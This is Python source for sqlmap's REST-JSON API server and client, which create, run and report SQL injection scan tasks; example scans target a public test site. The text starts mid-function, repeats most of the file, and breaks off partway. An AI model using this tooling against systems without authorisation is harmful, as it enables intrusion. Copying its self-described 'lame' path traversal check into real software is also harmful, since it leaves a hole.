                logger.error("Invalid task ID '%s'" % taskid)
                taskid = None
                continue
            logger.info("Switching to task ID '%s' " % taskid)

        elif command in ("list", "flush"):
            raw = _client("%s/admin/%s/%s" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            elif command == "flush":
                taskid = None
            dataToStdout("%s\n" % raw)

        elif command in ("exit", "bye", "quit", 'q'):
            return

        elif command in ("help", "?"):
            msg =  "help        Show this help message\n"
            msg += "new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \"http://testphp.vulnweb.com/artists.php?artist=1\"')\n"
            msg += "use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n"
            msg += "data        Retrieve and show data for current task\n"
            msg += "log         Retrieve and show log for current task\n"
            msg += "status      Retrieve and show status for current task\n"
            msg += "stop        Stop current task\n"
            msg += "kill        Kill current task\n"
            msg += "list        Display all tasks\n"
            msg += "flush       Flush tasks (delete all tasks)\n"
            msg += "exit        Exit this client\n"

            dataToStdout(msg)

        elif command:
            logger.error("Unknown command '%s'" % command)

#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = ""
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who="server"):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug("REST-JSON API %s connected to IPC database" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not "locked" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith("SELECT"):
            return self.cursor.fetchall()

    def init(self):
        self.execute("CREATE TABLE logs("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, time TEXT, "
                  "level TEXT, message TEXT"
                  ")")

        self.execute("CREATE TABLE data("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, status INTEGER, "
                  "content_type INTEGER, value TEXT"
                  ")")

        self.execute("CREATE TABLE errors("
                    "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                    "taskid INTEGER, error TEXT"
                    ")")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {"boolean": False, "string": None, "integer": None, "float": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists("sqlmap.py"):
            self.process = Popen(["python", "sqlmap.py", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen(["sqlmap", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype="stdout"):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == "stdout":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == "stdout":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                "SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute("DELETE FROM data WHERE id = ?",
                                                     (output[index][0],))

                conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = "%s%s" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute("UPDATE data SET value = ? WHERE id = ?",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute("INSERT INTO errors VALUES(NULL, ?, ?)",
                                         (self.taskid, str(value) if value else ""))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """
        conf.database_cursor.execute("INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)",
                                     (conf.taskid, time.strftime("%X"), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, "api"):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect("client")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, "%s ('%s')" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook("after_request")
def security_headers(json_header=True):
    """
    Set some headers across all HTTP responses
    """
    response.headers["Server"] = "Server"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Pragma"] = "no-cache"
    response.headers["Cache-Control"] = "no-cache"
    response.headers["Expires"] = "0"
    if json_header:
        response.content_type = "application/json; charset=UTF-8"

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return "Access denied"


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return "Nothing here"


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return "Method not allowed"


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return "Internal server error"

#############################
# Task management functions #
#############################


# Users' methods
@get("/task/new")
def task_new():
    """
    Create new task ID
    """
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug("Created new task: '%s'" % taskid)
    return jsonize({"success": True, "taskid": taskid})


@get("/task/<taskid>/delete")
def task_delete(taskid):
    """
    Delete own task ID
    """
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug("[%s] Deleted task" % taskid)
        return jsonize({"success": True})
    else:
        logger.warning("[%s] Invalid task ID provided to task_delete()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

###################
# Admin functions #
###################


@get("/admin/<taskid>/list")
def task_list(taskid=None):
    """
    List task pull
    """
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))["status"]

    logger.debug("[%s] Listed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True, "tasks": tasks, "tasks_num": len(tasks)})

@get("/admin/<taskid>/flush")
def task_flush(taskid):
    """
    Flush task spool (delete all tasks)
    """

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug("[%s] Flushed task pool (%s)" % (taskid, "admin" if is_admin(taskid) else request.remote_addr))
    return jsonize({"success": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get("/option/<taskid>/list")
def option_list(taskid):
    """
    List options for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_list()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    logger.debug("[%s] Listed task options" % taskid)
    return jsonize({"success": True, "options": DataStore.tasks[taskid].get_options()})


@post("/option/<taskid>/get")
def option_get(taskid):
    """
    Get the value of an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_get()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    option = request.json.get("option", "")

    if option in DataStore.tasks[taskid].options:
        logger.debug("[%s] Retrieved value for option %s" % (taskid, option))
        return jsonize({"success": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug("[%s] Requested value for unknown option %s" % (taskid, option))
        return jsonize({"success": False, "message": "Unknown option", option: "not set"})


@post("/option/<taskid>/set")
def option_set(taskid):
    """
    Set an option (command line switch) for a certain task ID
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to option_set()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug("[%s] Requested to set options" % taskid)
    return jsonize({"success": True})


# Handle scans
@post("/scan/<taskid>/start")
def scan_start(taskid):
    """
    Launch a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_start()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug("[%s] Started scan" % taskid)
    return jsonize({"success": True, "engineid": DataStore.tasks[taskid].engine_get_id()})


@get("/scan/<taskid>/stop")
def scan_stop(taskid):
    """
    Stop a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_stop()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_stop()

    logger.debug("[%s] Stopped scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/kill")
def scan_kill(taskid):
    """
    Kill a scan
    """
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning("[%s] Invalid task ID provided to scan_kill()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    DataStore.tasks[taskid].engine_kill()

    logger.debug("[%s] Killed scan" % taskid)
    return jsonize({"success": True})


@get("/scan/<taskid>/status")
def scan_status(taskid):
    """
    Returns status of a scan
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_status()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if DataStore.tasks[taskid].engine_process() is None:
        status = "not running"
    else:
        status = "terminated" if DataStore.tasks[taskid].engine_has_terminated() is True else "running"

    logger.debug("[%s] Retrieved scan status" % taskid)
    return jsonize({
        "success": True,
        "status": status,
        "returncode": DataStore.tasks[taskid].engine_get_returncode()
    })


@get("/scan/<taskid>/data")
def scan_data(taskid):
    """
    Retrieve the data of a scan
    """
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_data()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            "SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_data_message.append(
            {"status": status, "type": content_type, "value": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            "SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug("[%s] Retrieved scan data and error messages" % taskid)
    return jsonize({"success": True, "data": json_data_message, "error": json_errors_message})


# Functions to handle scans' logs
@get("/scan/<taskid>/log/<start>/<end>")
def scan_log_limited(taskid, start, end):
    """
    Retrieve a subset of log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning("[%s] Invalid start or end value provided to scan_log_limited()" % taskid)
        return jsonize({"success": False, "message": "Invalid start or end value, must be digits"})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ("SELECT time, level, message FROM logs WHERE "
             "taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC"),
            (taskid, start, end)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages subset" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


@get("/scan/<taskid>/log")
def scan_log(taskid):
    """
    Retrieve the log messages
    """
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to scan_log()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            "SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC", (taskid,)):
        json_log_messages.append({"time": time_, "level": level, "message": message})

    logger.debug("[%s] Retrieved scan log messages" % taskid)
    return jsonize({"success": True, "log": json_log_messages})


# Function to handle files inside the output directory
@get("/download/<taskid>/<target>/<filename:path>")
def download(taskid, target, filename):
    """
    Download a certain file from the file system
    """
    if taskid not in DataStore.tasks:
        logger.warning("[%s] Invalid task ID provided to download()" % taskid)
        return jsonize({"success": False, "message": "Invalid task ID"})

    # Prevent file path traversal - the lame way
    if ".." in target:                    
        logger.warning("[%s] Forbidden path (%s)" % (taskid, target))
        return jsonize({"success": False, "message": "Forbidden path"})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)                    

    if os.path.exists(path):                    
        logger.debug("[%s] Retrieved content of file %s" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({"success": True, "file": file_content.encode("base64")})
    else:
        logger.warning("[%s] File does not exist %s" % (taskid, target))
        return jsonize({"success": False, "message": "File does not exist"})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """
    REST-JSON API server
    """
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix="sqlmapipc-", text=False)[1]

    logger.info("Running REST-JSON API server at '%s:%d'.." % (host, port))
    logger.info("Admin ID: %s" % DataStore.admin_id)
    logger.debug("IPC database: %s" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == "gevent":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == "eventlet":
            import eventlet
            eventlet.monkey_patch()
        logger.debug("Using adapter '%s' to run bottle" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if "already in use" in getSafeExString(ex):
            logger.error("Address already in use ('%s:%s')" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = "Adapter '%s' is not available on this system" % adapter
        if adapter in ("gevent", "eventlet"):
            errMsg += " (e.g.: 'sudo apt-get install python-%s')" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug("Calling %s" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error("Failed to load and parse %s" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """
    REST-JSON API client
    """

    dbgMsg = "Example client access from command line:"
    dbgMsg += "\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid" % (host, port)
    dbgMsg += "\n\t$ curl -H \"Content-Type: application/json\" -X POST -d '{\"url\": \"http://testphp.vulnweb.com/artists.php?artist=1\"}' http://%s:%d/scan/$taskid/start" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/data" % (host, port)
    dbgMsg += "\n\t$ curl http://%s:%d/scan/$taskid/log" % (host, port)
    logger.debug(dbgMsg)

    addr = "http://%s:%d" % (host, port)
    logger.info("Starting REST-JSON API client to '%s'..." % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = "There has been a problem while connecting to the "
            errMsg += "REST-JSON API server at '%s' " % addr
            errMsg += "(%s)" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info("Type 'help' or '?' for list of available commands")

    while True:
        try:
            command = raw_input("api%s> " % (" (%s)" % taskid if taskid else "")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in ("data", "log", "status", "stop", "kill"):
            if not taskid:
                logger.error("No task ID in use")
                continue
            raw = _client("%s/scan/%s/%s" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            dataToStdout("%s\n" % raw)

        elif command.startswith("new"):
            if ' ' not in command:
                logger.error("Program arguments are missing")
                continue

            argv = ["sqlmap.py"] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client("%s/task/new" % addr)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to create new task")
                continue
            taskid = res["taskid"]
            logger.info("New task ID is '%s'" % taskid)

            raw = _client("%s/scan/%s/start" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to start scan")
                continue
            logger.info("Scanning started")

        elif command.startswith("use"):
            taskid = (command.split()[1] if ' ' in command else "").strip("'\"")
            if not taskid:
                logger.error("Task ID is missing")
                taskid = None
                continue
            elif not re.search(r"\A[0-9a-fA-F]{16}\Z", taskid):
                logger.error("Invalid task ID '%s'" % taskid)
                taskid = None
                continue
            logger.info("Switching to task ID '%s' " % taskid)

        elif command in ("list", "flush"):
            raw = _client("%s/admin/%s/%s" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res["success"]:
                logger.error("Failed to execute command %s" % command)
            elif command == "flush":
                taskid = None
            dataToStdout("%s\n" % raw)

        elif command in ("exit", "bye", "quit", 'q'):
            return

        elif command in ("help", "?"):
            msg =  "help        Show this help message\n"
            msg += "new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \"http://testphp.vulnweb.com/artists.php?artist=1\"')\n"
            msg += "use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n"
            msg += "data        Retrieve and show data for current task\n"
            msg += "log         Retrieve and show log for current task\n"
            msg += "status      Retrieve and show status for current task\n"
            msg += "stop        Stop current task\n"
            msg += "kill        Kill current task\n"
            msg += "list        Display all tasks\n"
            msg += "flush       Flush tasks (delete all tasks)\n"
            msg += "exit        Exit this client\n"

            dataToStdout(msg)

        elif command:
            logger.error("Unknown command '%s'" % command)

#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = ""
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who="server"):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug("REST-JSON API %s connected to IPC database" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not "locked" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith("SELECT"):
            return self.cursor.fetchall()

    def init(self):
        self.execute("CREATE TABLE logs("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, time TEXT, "
                  "level TEXT, message TEXT"
                  ")")

        self.execute("CREATE TABLE data("
                  "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                  "taskid INTEGER, status INTEGER, "
                  "content_type INTEGER, value TEXT"
                  ")")

        self.execute("CREATE TABLE errors("
                    "id INTEGER PRIMARY KEY AUTOINCREMENT, "
                    "taskid INTEGER, error TEXT"
                    ")")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {"boolean": False, "string": None, "integer": None, "float": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists("sqlmap.py"):
            self.process = Popen(["python", "sqlmap.py", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen(["sqlmap", "--pickled-options", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype="stdout"):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == "stdout":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == "stdout":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                "SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute("DELETE FROM data WHERE id = ?",
                                                     (output[index][0],))

                conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute("INSERT INTO data VALUES(NULL, ?, ?, ?, ?)",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = "%s%s" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute("UPDATE data SET value = ? WHERE id = ?",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute("INSERT INTO errors VALUES(NULL, ?, ?)",
                                         (self.taskid, str(value) if value else ""))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """
        conf.database_cursor.execute("INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)",
                                     (conf.taskid, time.strftime("%X"), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, "api"):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect("client")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, "%s ('%s')" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook("after_request")
def security_headers(json_header=True):
    """
    Set some headers across all HTTP responses
    """
    response.headers["Server"] = "Server"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Pragma"] = "no-cache"
    response.headers["Cache-Control"] = "no-cache"
    response.headers["Expires"] = "0"
    if json_header:
        response.content_type = "application/json; charset=UTF-8"

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return "Access denied"


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return "Nothing here"


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return "Method not allowed"


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return "Internal server error"

#############################
# Task management functions #
#############################


# Users' methods
@get("/task/new")
def task_new():
    """
    Create new task ID
    """
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

